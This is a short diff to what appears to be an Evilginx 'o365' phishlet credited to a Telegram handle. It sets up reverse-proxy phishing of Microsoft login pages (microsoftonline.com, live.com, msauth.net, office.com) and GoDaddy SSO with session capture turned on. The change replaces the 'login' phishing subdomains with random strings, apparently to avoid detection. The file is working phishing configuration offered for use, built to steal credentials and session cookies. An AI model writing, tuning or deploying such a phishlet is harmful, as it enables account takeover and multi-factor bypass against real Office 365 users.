@@ -2,9 +2,9 @@ name: 'o365'
 author: 'https://t.me/Jhay_nyce'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'rdfwe', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
+  - {phish_sub: 'esefge', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
   - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false}
   - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false} 
   - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false}
